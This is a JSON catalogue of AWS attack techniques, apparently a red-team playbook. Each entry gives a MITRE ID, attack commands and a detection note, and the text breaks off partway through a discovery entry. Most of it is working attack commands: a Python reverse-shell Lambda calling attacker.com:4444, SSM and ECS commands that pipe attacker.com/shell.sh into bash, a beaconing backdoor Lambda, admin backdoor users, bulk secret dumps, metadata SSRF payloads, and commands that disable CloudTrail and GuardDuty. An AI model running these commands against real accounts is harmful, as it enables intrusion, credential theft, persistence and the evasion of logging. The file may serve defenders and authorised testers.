{
  "infrastructure": "aws",
  "name": "AWS Cloud Attack Techniques",
  "version": "2.0.0",
  "techniques": [
    {
      "id": "AWS-RECON-001",
      "mitre_id": "T1580",
      "name": "AWS Account Discovery",
      "phase": "reconnaissance",
      "infrastructure": "aws",
      "description": "Enumerate AWS account information, regions, and services using API calls or metadata",
      "prerequisites": ["Valid AWS credentials or access to EC2 instance"],
      "tools": ["AWS CLI", "Pacu", "ScoutSuite", "Prowler"],
      "commands": [
        "# Get current identity\naws sts get-caller-identity",
        "# List all regions\naws ec2 describe-regions --query 'Regions[].RegionName' --output text",
        "# Get account ID and aliases\naws iam list-account-aliases\naws organizations describe-account --account-id $(aws sts get-caller-identity --query Account --output text)",
        "# Enumerate services in use\naws resourcegroupstaggingapi get-resources --region us-east-1",
        "# Pacu module\nrun aws__enum_account"
      ],
      "detection": "CloudTrail logs for DescribeAccount, GetCallerIdentity API calls",
      "references": ["https://attack.mitre.org/techniques/T1580/"],
      "next_techniques": ["AWS-RECON-002", "AWS-RECON-003"],
      "risk_level": "low"
    },
    {
      "id": "AWS-RECON-002",
      "mitre_id": "T1526",
      "name": "S3 Bucket Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "aws",
      "description": "Discover and enumerate S3 buckets, checking for public access and misconfigurations",
      "prerequisites": ["Target organization name or domain"],
      "tools": ["S3Scanner", "bucket_finder", "AWSBucketDump", "slurp"],
      "commands": [
        "# List all buckets in account\naws s3 ls",
        "# Check bucket ACL\naws s3api get-bucket-acl --bucket <bucket-name>",
        "# Check bucket policy\naws s3api get-bucket-policy --bucket <bucket-name>",
        "# Check public access block\naws s3api get-public-access-block --bucket <bucket-name>",
        "# List objects in bucket\naws s3 ls s3://<bucket-name> --recursive",
        "# S3Scanner enumeration\npython3 s3scanner.py --bucket-file buckets.txt",
        "# Check if bucket exists (unauthenticated)\ncurl -I https://<bucket-name>.s3.amazonaws.com/"
      ],
      "detection": "S3 access logs, CloudTrail S3 data events",
      "references": ["https://attack.mitre.org/techniques/T1526/"],
      "next_techniques": ["AWS-COLL-001"],
      "risk_level": "low"
    },
    {
      "id": "AWS-RECON-003",
      "mitre_id": "T1087.004",
      "name": "IAM User and Role Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "aws",
      "description": "Enumerate IAM users, roles, groups, and policies to identify privilege escalation paths",
      "prerequisites": ["IAM read permissions"],
      "tools": ["Pacu", "enumerate-iam", "AWS CLI", "PMapper"],
      "commands": [
        "# List all IAM users\naws iam list-users",
        "# List all IAM roles\naws iam list-roles",
        "# List all IAM groups\naws iam list-groups",
        "# Get user details\naws iam get-user --user-name <username>",
        "# List user policies\naws iam list-user-policies --user-name <username>\naws iam list-attached-user-policies --user-name <username>",
        "# List role policies\naws iam list-role-policies --role-name <role-name>\naws iam list-attached-role-policies --role-name <role-name>",
        "# Get policy document\naws iam get-policy-version --policy-arn <policy-arn> --version-id v1",
        "# Enumerate permissions with enumerate-iam\npython3 enumerate-iam.py --access-key <key> --secret-key <secret>",
        "# PMapper analysis\npmapper graph create\npmapper analysis"
      ],
      "detection": "CloudTrail logs for IAM List* and Get* API calls",
      "references": ["https://attack.mitre.org/techniques/T1087/004/"],
      "next_techniques": ["AWS-PRIVESC-001", "AWS-PRIVESC-002"],
      "risk_level": "low"
    },
    {
      "id": "AWS-INIT-001",
      "mitre_id": "T1078.004",
      "name": "Compromised AWS Credentials",
      "phase": "initial_access",
      "infrastructure": "aws",
      "description": "Use stolen or leaked AWS access keys from code repos, config files, or phishing",
      "prerequisites": ["Access to leaked credentials"],
      "tools": ["truffleHog", "git-secrets", "AWS CLI"],
      "commands": [
        "# Configure AWS CLI with stolen credentials\naws configure set aws_access_key_id <ACCESS_KEY>\naws configure set aws_secret_access_key <SECRET_KEY>",
        "# Use credentials with profile\nexport AWS_ACCESS_KEY_ID=<ACCESS_KEY>\nexport AWS_SECRET_ACCESS_KEY=<SECRET_KEY>\nexport AWS_SESSION_TOKEN=<TOKEN>  # if temporary creds",
        "# Verify credentials work\naws sts get-caller-identity",
        "# Search git repos for secrets\ntrufflehog git https://github.com/target/repo",
        "# Search for AWS keys in files\ngrep -r 'AKIA' /path/to/search",
        "# git-secrets scan\ngit secrets --scan"
      ],
      "detection": "GuardDuty UnauthorizedAccess findings, credential usage from unusual IPs",
      "references": ["https://attack.mitre.org/techniques/T1078/004/"],
      "next_techniques": ["AWS-RECON-001", "AWS-EXEC-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-INIT-002",
      "mitre_id": "T1199",
      "name": "Trusted Relationship Abuse",
      "phase": "initial_access",
      "infrastructure": "aws",
      "description": "Abuse cross-account trust relationships or federated identity to gain access",
      "prerequisites": ["Access to trusted account or identity provider"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# Assume role in another account\naws sts assume-role --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<ROLE_NAME> --role-session-name attack-session",
        "# Use assumed role credentials\nexport AWS_ACCESS_KEY_ID=<from_response>\nexport AWS_SECRET_ACCESS_KEY=<from_response>\nexport AWS_SESSION_TOKEN=<from_response>",
        "# List roles with external trust\naws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=`*`]]'",
        "# Check role trust policy\naws iam get-role --role-name <role-name> --query 'Role.AssumeRolePolicyDocument'"
      ],
      "detection": "CloudTrail AssumeRole events from external accounts",
      "references": ["https://attack.mitre.org/techniques/T1199/"],
      "next_techniques": ["AWS-PRIVESC-003"],
      "risk_level": "high"
    },
    {
      "id": "AWS-INIT-003",
      "mitre_id": "T1190",
      "name": "Exploit Public-Facing Application",
      "phase": "initial_access",
      "infrastructure": "aws",
      "description": "Exploit vulnerabilities in public-facing applications hosted on EC2, ECS, or Lambda",
      "prerequisites": ["Vulnerable application endpoint"],
      "tools": ["Burp Suite", "SQLMap", "Custom exploits"],
      "commands": [
        "# SSRF to metadata endpoint (if IMDSv1)\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "# Get role credentials via SSRF\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>",
        "# Test for SSRF via application\ncurl 'http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/'",
        "# SQLMap for RDS backend\nsqlmap -u 'http://target.com/page?id=1' --dbs"
      ],
      "detection": "WAF logs, application logs, VPC Flow Logs",
      "references": ["https://attack.mitre.org/techniques/T1190/"],
      "next_techniques": ["AWS-EXEC-002", "AWS-CRED-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-EXEC-001",
      "mitre_id": "T1059.004",
      "name": "AWS CLI Command Execution",
      "phase": "execution",
      "infrastructure": "aws",
      "description": "Execute AWS CLI commands using compromised credentials for resource manipulation",
      "prerequisites": ["Valid AWS credentials"],
      "tools": ["AWS CLI", "Boto3", "Pacu"],
      "commands": [
        "# Run Pacu for automated exploitation\npython3 pacu.py\nrun iam__enum_permissions\nrun iam__privesc_scan",
        "# Create resources via CLI\naws ec2 run-instances --image-id ami-12345 --instance-type t2.micro",
        "# Invoke Lambda function\naws lambda invoke --function-name <function> output.txt",
        "# Using boto3\nimport boto3\nclient = boto3.client('iam')\nclient.list_users()"
      ],
      "detection": "CloudTrail API activity from unusual sources",
      "references": ["https://attack.mitre.org/techniques/T1059/004/"],
      "next_techniques": ["AWS-PERSIST-001", "AWS-PRIVESC-001"],
      "risk_level": "medium"
    },
    {
      "id": "AWS-EXEC-002",
      "mitre_id": "T1648",
      "name": "Lambda Function Code Injection",
      "phase": "execution",
      "infrastructure": "aws",
      "description": "Modify Lambda function code to execute malicious payloads or exfiltrate data",
      "prerequisites": ["Lambda update permissions"],
      "tools": ["AWS CLI", "Pacu", "Custom scripts"],
      "commands": [
        "# Get existing function code\naws lambda get-function --function-name <function-name> --query 'Code.Location'",
        "# Update function code with malicious zip\naws lambda update-function-code --function-name <function-name> --zip-file fileb://malicious.zip",
        "# Add environment variable with backdoor\naws lambda update-function-configuration --function-name <function-name> --environment 'Variables={BACKDOOR=true}'",
        "# Create reverse shell Lambda\ncat > lambda_function.py << 'EOF'\nimport socket,subprocess,os\ndef handler(event, context):\n    s=socket.socket()\n    s.connect(('attacker.com',4444))\n    os.dup2(s.fileno(),0)\n    os.dup2(s.fileno(),1)\n    os.dup2(s.fileno(),2)\n    subprocess.call(['/bin/sh','-i'])\nEOF\nzip function.zip lambda_function.py\naws lambda update-function-code --function-name <func> --zip-file fileb://function.zip"
      ],
      "detection": "CloudTrail UpdateFunctionCode events, Lambda version changes",
      "references": ["https://attack.mitre.org/techniques/T1648/"],
      "next_techniques": ["AWS-CRED-002", "AWS-EXFIL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-EXEC-003",
      "mitre_id": "T1059",
      "name": "SSM Run Command",
      "phase": "execution",
      "infrastructure": "aws",
      "description": "Use AWS Systems Manager Run Command to execute commands on EC2 instances",
      "prerequisites": ["SSM SendCommand permissions", "Target instances with SSM agent"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# List SSM managed instances\naws ssm describe-instance-information",
        "# Execute command on instance\naws ssm send-command --instance-ids i-1234567890abcdef0 --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"whoami\",\"id\",\"cat /etc/passwd\"]'",
        "# Execute PowerShell on Windows\naws ssm send-command --instance-ids i-1234567890abcdef0 --document-name \"AWS-RunPowerShellScript\" --parameters 'commands=[\"Get-Process\",\"whoami\"]'",
        "# Get command output\naws ssm list-command-invocations --command-id <command-id> --details",
        "# Start interactive session\naws ssm start-session --target i-1234567890abcdef0",
        "# Download and execute payload\naws ssm send-command --instance-ids i-xxx --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"curl http://attacker.com/shell.sh | bash\"]'"
      ],
      "detection": "CloudTrail SendCommand events, SSM command history",
      "references": ["https://attack.mitre.org/techniques/T1059/"],
      "next_techniques": ["AWS-CRED-001", "AWS-LATERAL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-EXEC-004",
      "mitre_id": "T1059",
      "name": "ECS Task Execution",
      "phase": "execution",
      "infrastructure": "aws",
      "description": "Execute commands in ECS containers using ECS Exec or by running new tasks",
      "prerequisites": ["ECS task execution permissions", "ECS Exec enabled"],
      "tools": ["AWS CLI", "Docker"],
      "commands": [
        "# List ECS clusters\naws ecs list-clusters",
        "# List services in cluster\naws ecs list-services --cluster <cluster-name>",
        "# List running tasks\naws ecs list-tasks --cluster <cluster-name> --service-name <service>",
        "# Execute command in running container (ECS Exec)\naws ecs execute-command --cluster <cluster> --task <task-id> --container <container> --interactive --command \"/bin/bash\"",
        "# Run new task with custom command\naws ecs run-task --cluster <cluster> --task-definition <task-def> --overrides '{\"containerOverrides\":[{\"name\":\"container\",\"command\":[\"/bin/bash\",\"-c\",\"curl attacker.com/shell.sh|bash\"]}]}'",
        "# Describe task to get metadata\naws ecs describe-tasks --cluster <cluster> --tasks <task-id>",
        "# Get container credentials from metadata\ncurl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
      ],
      "detection": "CloudTrail ECS ExecuteCommand events, container logs",
      "references": ["https://attack.mitre.org/techniques/T1059/"],
      "next_techniques": ["AWS-CRED-001", "AWS-LATERAL-002"],
      "risk_level": "high"
    },
    {
      "id": "AWS-PERSIST-001",
      "mitre_id": "T1098.001",
      "name": "IAM Access Key Creation",
      "phase": "persistence",
      "infrastructure": "aws",
      "description": "Create additional IAM access keys for persistent access to compromised accounts",
      "prerequisites": ["IAM CreateAccessKey permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# Create access key for current user\naws iam create-access-key",
        "# Create access key for another user\naws iam create-access-key --user-name <target-user>",
        "# List existing access keys\naws iam list-access-keys --user-name <username>",
        "# Pacu persistence module\nrun iam__backdoor_users_keys"
      ],
      "detection": "CloudTrail CreateAccessKey events, multiple active keys per user",
      "references": ["https://attack.mitre.org/techniques/T1098/001/"],
      "next_techniques": ["AWS-EXEC-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-PERSIST-002",
      "mitre_id": "T1098",
      "name": "Lambda Backdoor",
      "phase": "persistence",
      "infrastructure": "aws",
      "description": "Create or modify Lambda functions to maintain persistent access with scheduled triggers",
      "prerequisites": ["Lambda create/update permissions"],
      "tools": ["AWS CLI", "Pacu", "Custom Lambda code"],
      "commands": [
        "# Create Lambda execution role\naws iam create-role --role-name backdoor-role --assume-role-policy-document file://trust-policy.json",
        "# Create backdoor Lambda function\naws lambda create-function --function-name backdoor-func --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/backdoor-role --handler lambda_function.handler --zip-file fileb://backdoor.zip",
        "# Add scheduled trigger (every hour)\naws events put-rule --name backdoor-trigger --schedule-expression 'rate(1 hour)'",
        "# Connect trigger to Lambda\naws events put-targets --rule backdoor-trigger --targets Id=1,Arn=arn:aws:lambda:REGION:ACCOUNT:function:backdoor-func",
        "# Lambda code for reverse shell or exfil\ncat > lambda_function.py << 'EOF'\nimport urllib.request\ndef handler(event, context):\n    urllib.request.urlopen('http://attacker.com/beacon?alive=1')\nEOF",
        "# Pacu Lambda persistence\nrun lambda__backdoor_new_roles\nrun lambda__backdoor_new_sec_groups"
      ],
      "detection": "CloudTrail Lambda events, new EventBridge rules",
      "references": ["https://attack.mitre.org/techniques/T1098/"],
      "next_techniques": ["AWS-CRED-002"],
      "risk_level": "high"
    },
    {
      "id": "AWS-PERSIST-003",
      "mitre_id": "T1136.003",
      "name": "IAM User Creation",
      "phase": "persistence",
      "infrastructure": "aws",
      "description": "Create new IAM users with programmatic access for persistent backdoor",
      "prerequisites": ["IAM CreateUser and CreateAccessKey permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# Create new IAM user\naws iam create-user --user-name backdoor-user",
        "# Attach admin policy\naws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        "# Create access keys\naws iam create-access-key --user-name backdoor-user",
        "# Create login profile for console access\naws iam create-login-profile --user-name backdoor-user --password 'ComplexP@ss123!' --no-password-reset-required",
        "# Pacu backdoor module\nrun iam__backdoor_users_password\nrun iam__backdoor_users_keys"
      ],
      "detection": "CloudTrail CreateUser events, GuardDuty findings",
      "references": ["https://attack.mitre.org/techniques/T1136/003/"],
      "next_techniques": ["AWS-PRIVESC-001"],
      "risk_level": "critical"
    },
    {
      "id": "AWS-PERSIST-004",
      "mitre_id": "T1525",
      "name": "EC2 Instance with Backdoor AMI",
      "phase": "persistence",
      "infrastructure": "aws",
      "description": "Create AMI with backdoor and launch instances or share with target accounts",
      "prerequisites": ["EC2 CreateImage permissions"],
      "tools": ["AWS CLI", "Custom scripts"],
      "commands": [
        "# Create AMI from compromised instance\naws ec2 create-image --instance-id i-1234567890abcdef0 --name 'backdoored-ami' --description 'Legitimate looking description'",
        "# Share AMI with other accounts\naws ec2 modify-image-attribute --image-id ami-12345 --launch-permission 'Add=[{UserId=123456789012}]'",
        "# Make AMI public (dangerous)\naws ec2 modify-image-attribute --image-id ami-12345 --launch-permission 'Add=[{Group=all}]'",
        "# Launch instance from backdoored AMI\naws ec2 run-instances --image-id ami-backdoor --instance-type t2.micro --key-name mykey"
      ],
      "detection": "CloudTrail CreateImage events, AMI sharing to external accounts",
      "references": ["https://attack.mitre.org/techniques/T1525/"],
      "next_techniques": ["AWS-LATERAL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-PRIVESC-001",
      "mitre_id": "T1548",
      "name": "IAM Policy Privilege Escalation",
      "phase": "privilege_escalation",
      "infrastructure": "aws",
      "description": "Exploit overly permissive IAM policies to escalate privileges (iam:*, PassRole, etc.)",
      "prerequisites": ["IAM policy modification or role assumption permissions"],
      "tools": ["Pacu", "PMapper", "AWS CLI"],
      "commands": [
        "# Scan for privesc paths with Pacu\nrun iam__privesc_scan",
        "# Attach admin policy to user\naws iam attach-user-policy --user-name <user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        "# Put inline policy with full access\naws iam put-user-policy --user-name <user> --policy-name privesc --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
        "# Add user to admin group\naws iam add-user-to-group --user-name <user> --group-name Administrators",
        "# Create policy version with admin access\naws iam create-policy-version --policy-arn <policy-arn> --policy-document file://admin-policy.json --set-as-default",
        "# PMapper privesc analysis\npmapper graph create\npmapper analysis --output-type text"
      ],
      "detection": "CloudTrail IAM policy changes, GuardDuty privilege escalation findings",
      "references": ["https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"],
      "next_techniques": ["AWS-PERSIST-001", "AWS-CRED-002"],
      "risk_level": "critical"
    },
    {
      "id": "AWS-PRIVESC-002",
      "mitre_id": "T1548",
      "name": "PassRole Exploitation",
      "phase": "privilege_escalation",
      "infrastructure": "aws",
      "description": "Abuse iam:PassRole to attach high-privilege roles to compute resources",
      "prerequisites": ["iam:PassRole permission", "Compute resource creation permissions"],
      "tools": ["Pacu", "AWS CLI"],
      "commands": [
        "# List roles you can pass\naws iam list-roles --query 'Roles[].RoleName'",
        "# Create EC2 with admin role\naws ec2 run-instances --image-id ami-12345 --instance-type t2.micro --iam-instance-profile Name=AdminRole",
        "# Create Lambda with high-priv role\naws lambda create-function --function-name privesc-func --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole --handler handler.main --zip-file fileb://code.zip",
        "# Update Lambda role\naws lambda update-function-configuration --function-name <func> --role arn:aws:iam::ACCOUNT:role/AdminRole",
        "# Run Glue job with admin role\naws glue create-job --name privesc-job --role AdminRole --command Name=glueetl,ScriptLocation=s3://bucket/script.py"
      ],
      "detection": "CloudTrail PassRole events, new role associations",
      "references": ["https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"],
      "next_techniques": ["AWS-EXEC-003", "AWS-CRED-001"],
      "risk_level": "critical"
    },
    {
      "id": "AWS-PRIVESC-003",
      "mitre_id": "T1078.004",
      "name": "Cross-Account Role Assumption",
      "phase": "privilege_escalation",
      "infrastructure": "aws",
      "description": "Assume roles in other AWS accounts using misconfigured trust policies",
      "prerequisites": ["Role with overly permissive trust policy"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# Find roles with external trust\nfor role in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do\n  echo \"=== $role ===\"\n  aws iam get-role --role-name $role --query 'Role.AssumeRolePolicyDocument'\ndone",
        "# Assume role in target account\naws sts assume-role --role-arn arn:aws:iam::<TARGET>:role/<ROLE> --role-session-name attack",
        "# Export credentials from assume-role response\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>",
        "# Verify new identity\naws sts get-caller-identity",
        "# Pacu cross-account enumeration\nrun iam__enum_assume_role"
      ],
      "detection": "CloudTrail AssumeRole events from external accounts",
      "references": ["https://attack.mitre.org/techniques/T1078/004/"],
      "next_techniques": ["AWS-RECON-001", "AWS-PRIVESC-001"],
      "risk_level": "critical"
    },
    {
      "id": "AWS-PRIVESC-004",
      "mitre_id": "T1548",
      "name": "Lambda Role Abuse",
      "phase": "privilege_escalation",
      "infrastructure": "aws",
      "description": "Create/update Lambda with high-privilege execution role to escalate privileges",
      "prerequisites": ["Lambda create/update permissions", "iam:PassRole"],
      "tools": ["Pacu", "AWS CLI"],
      "commands": [
        "# Create privesc Lambda code\ncat > lambda_function.py << 'EOF'\nimport boto3\ndef handler(event, context):\n    client = boto3.client('iam')\n    # Create new admin user\n    client.create_user(UserName='backdoor-admin')\n    client.attach_user_policy(UserName='backdoor-admin', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')\n    keys = client.create_access_key(UserName='backdoor-admin')\n    return keys['AccessKey']\nEOF",
        "# Create Lambda with admin role\nzip privesc.zip lambda_function.py\naws lambda create-function --function-name privesc --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole --handler lambda_function.handler --zip-file fileb://privesc.zip",
        "# Invoke to escalate\naws lambda invoke --function-name privesc output.json\ncat output.json",
        "# Pacu Lambda privesc\nrun lambda__backdoor_new_roles"
      ],
      "detection": "CloudTrail Lambda events with high-privilege role associations",
      "references": ["https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"],
      "next_techniques": ["AWS-CRED-002"],
      "risk_level": "critical"
    },
    {
      "id": "AWS-DEFENSE-001",
      "mitre_id": "T1562.008",
      "name": "CloudTrail Logging Disable",
      "phase": "defense_evasion",
      "infrastructure": "aws",
      "description": "Disable or modify CloudTrail logging to hide malicious activity",
      "prerequisites": ["CloudTrail modification permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# List CloudTrail trails\naws cloudtrail describe-trails",
        "# Stop logging\naws cloudtrail stop-logging --name <trail-name>",
        "# Delete trail\naws cloudtrail delete-trail --name <trail-name>",
        "# Update trail to exclude events\naws cloudtrail put-event-selectors --trail-name <trail> --event-selectors '[]'",
        "# Pacu CloudTrail disruption\nrun detection__disruption"
      ],
      "detection": "CloudTrail StopLogging events, GuardDuty findings",
      "references": ["https://attack.mitre.org/techniques/T1562/008/"],
      "next_techniques": [],
      "risk_level": "critical"
    },
    {
      "id": "AWS-DEFENSE-002",
      "mitre_id": "T1562.001",
      "name": "GuardDuty Disable",
      "phase": "defense_evasion",
      "infrastructure": "aws",
      "description": "Disable GuardDuty detector to prevent threat detection",
      "prerequisites": ["GuardDuty modification permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# List GuardDuty detectors\naws guardduty list-detectors",
        "# Disable detector\naws guardduty update-detector --detector-id <detector-id> --no-enable",
        "# Delete detector\naws guardduty delete-detector --detector-id <detector-id>",
        "# Suspend findings\naws guardduty update-detector --detector-id <id> --finding-publishing-frequency FIFTEEN_MINUTES"
      ],
      "detection": "CloudTrail DeleteDetector events, GuardDuty status changes",
      "references": ["https://attack.mitre.org/techniques/T1562/001/"],
      "next_techniques": [],
      "risk_level": "critical"
    },
    {
      "id": "AWS-DEFENSE-003",
      "mitre_id": "T1578.002",
      "name": "Security Group Modification",
      "phase": "defense_evasion",
      "infrastructure": "aws",
      "description": "Modify security groups to allow unauthorized network access",
      "prerequisites": ["EC2 security group modification permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# List security groups\naws ec2 describe-security-groups",
        "# Open SSH from anywhere\naws ec2 authorize-security-group-ingress --group-id sg-12345 --protocol tcp --port 22 --cidr 0.0.0.0/0",
        "# Open all traffic\naws ec2 authorize-security-group-ingress --group-id sg-12345 --protocol all --cidr 0.0.0.0/0",
        "# Add outbound rule for exfil\naws ec2 authorize-security-group-egress --group-id sg-12345 --protocol tcp --port 443 --cidr 0.0.0.0/0"
      ],
      "detection": "CloudTrail AuthorizeSecurityGroupIngress events, Config rules",
      "references": ["https://attack.mitre.org/techniques/T1578/002/"],
      "next_techniques": ["AWS-LATERAL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-CRED-001",
      "mitre_id": "T1552.005",
      "name": "EC2 Instance Metadata SSRF",
      "phase": "credential_access",
      "infrastructure": "aws",
      "description": "Exploit SSRF to access EC2 instance metadata service (IMDS) and steal IAM credentials",
      "prerequisites": ["SSRF vulnerability in application", "IMDSv1 enabled"],
      "tools": ["Burp Suite", "Custom scripts"],
      "commands": [
        "# Direct metadata access (from instance)\ncurl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "# Get role name\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "# Get credentials\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>",
        "# IMDSv2 token (if v2 required)\nTOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "# SSRF payloads for vulnerable apps\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://[::ffff:169.254.169.254]/latest/meta-data/\nhttp://169.254.169.254.xip.io/latest/meta-data/",
        "# Get user data (may contain secrets)\ncurl http://169.254.169.254/latest/user-data"
      ],
      "detection": "VPC Flow Logs to 169.254.169.254, IMDSv2 enforcement",
      "references": ["https://attack.mitre.org/techniques/T1552/005/"],
      "next_techniques": ["AWS-PRIVESC-001", "AWS-LATERAL-001"],
      "risk_level": "critical"
    },
    {
      "id": "AWS-CRED-002",
      "mitre_id": "T1552",
      "name": "Lambda Environment Variable Secrets",
      "phase": "credential_access",
      "infrastructure": "aws",
      "description": "Extract secrets and credentials from Lambda function environment variables",
      "prerequisites": ["Lambda GetFunction permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# List Lambda functions\naws lambda list-functions",
        "# Get function configuration with env vars\naws lambda get-function-configuration --function-name <function-name>",
        "# Extract all env vars from all functions\nfor func in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do\n  echo \"=== $func ===\"\n  aws lambda get-function-configuration --function-name $func --query 'Environment.Variables'\ndone",
        "# Pacu Lambda enumeration\nrun lambda__enum"
      ],
      "detection": "CloudTrail GetFunction events, Secrets Manager audit logs",
      "references": ["https://attack.mitre.org/techniques/T1552/"],
      "next_techniques": ["AWS-LATERAL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-CRED-003",
      "mitre_id": "T1552.001",
      "name": "Secrets Manager Extraction",
      "phase": "credential_access",
      "infrastructure": "aws",
      "description": "Extract secrets from AWS Secrets Manager or Parameter Store",
      "prerequisites": ["Secrets Manager or SSM GetParameter permissions"],
      "tools": ["AWS CLI", "Pacu"],
      "commands": [
        "# List secrets in Secrets Manager\naws secretsmanager list-secrets",
        "# Get secret value\naws secretsmanager get-secret-value --secret-id <secret-name>",
        "# List all SSM parameters\naws ssm describe-parameters",
        "# Get SSM parameter (SecureString)\naws ssm get-parameter --name <param-name> --with-decryption",
        "# Get all parameters by path\naws ssm get-parameters-by-path --path / --recursive --with-decryption",
        "# Dump all secrets\nfor secret in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do\n  echo \"=== $secret ===\"\n  aws secretsmanager get-secret-value --secret-id $secret --query SecretString --output text\ndone"
      ],
      "detection": "CloudTrail GetSecretValue events, unusual secret access patterns",
      "references": ["https://attack.mitre.org/techniques/T1552/001/"],
      "next_techniques": ["AWS-LATERAL-001"],
      "risk_level": "high"
    },
    {
      "id": "AWS-CRED-004",
      "mitre_id": "T1528",
      "name": "EKS Service Account Token Theft",
      "phase": "credential_access",
      "infrastructure": "aws",
      "description": "Steal Kubernetes service account tokens from EKS pods for cluster access",
      "prerequisites": ["Access to EKS pod or node"],
      "tools": ["kubectl", "Custom scripts"],
      "commands": [
        "# Get service account token from pod\ncat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "# Get CA cert\ncat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "# Get namespace\ncat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "# Use token with kubectl\nexport TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nkubectl --token=$TOKEN --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt get pods",
        "# Get AWS credentials from IRSA\naws sts get-caller-identity  # Uses web identity from EKS",
        "# List all secrets in cluster\nkubectl get secrets --all-namespaces",
        "# Get secret contents\nkubectl get secret <secret-name> -o jsonpath='{.data}'"
      ],
      "detection": "EKS audit logs, pod security policies",
      "references": ["https://attack.mitre.org/techniques/T1528/"],
      "next_techniques": ["AWS-LATERAL-002"],
      "risk_level": "high"
    },
    {
      "id": "AWS-DISC-001",
      "mitre_id": "T1580",
      "name": "Cloud Infrastructure Discovery",
      "phase": "discovery",
      "infrastructure": "aws",
      "description": "Enumerate EC2 instances, VPCs, subnets, and other infrastructure",
      "prerequisites": ["EC2 describe permissions"],
      "tools": ["AWS CLI", "Pacu", "ScoutSuite"],
      "commands": [
        "# List EC2 instances\naws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,IP:PrivateIpAddress,Public:PublicIpAddress,State:State.Name}'",
        "# List VPCs\naws ec2 describe-vpcs",
        "# List subnets\naws ec2 describe-subnets",
        "# List security groups\naws ec2 describe-security-groups",
        "# List RDS instances\naws rds describe-db-instances",
        "# Full infrastructure scan with ScoutSuite\nscout aws",
        "# Prowler security audit\nprowler aws"
      ],
      "detection": "CloudTrail Describe* API calls",
      "references": ["https://attack.mitre.org/techniques/T1580/"],
      "next_techniques": ["AWS-LATERAL-001"],
      "risk_level": "low"
    },
    {
      "id": "AWS-DISC-002",
      "mitre_id": "T1613",
      "name": "Container and EKS Discovery",
      "phase": "discovery",
      "infrastructure": "aws",
      "description": "Enumerate ECS tasks, EKS clusters, and container registries",
      "prerequisites": ["ECS/EKS describe permissions"],
      "tools": ["AWS CLI", "kubectl", "Pacu"],
      "commands": [
        "# List ECS clusters\naws ecs list-clusters",
        "# Describe ECS cluster\naws ecs describe-clusters --clusters <cluster-arn>",
        "# List ECS services\naws ecs list-services --cluster <cluster>",
        "# List running tasks\naws ecs list-tasks --cluster <cluster>",
        "# Describe task definition\naws ecs describe-task-definition --task-definition <task-def>",
        "# List EKS clusters\naws eks list-clusters",
        "# Describe EKS cluster\naws eks describe-cluster --name <cluster>",
        "# Update kubeconfig for EKS\naws eks update-kubeconfig --name <cluster>",
        "# List ECR repositories\naws ecr describe-repositories",
        "# List ECR images\naws ecr list-images --repository-name <repo>"
      ],
      "detection": "CloudTrail ECS/EKS describe events",
      "references": ["https://attack.mitre.org/techniques/T1613/"],
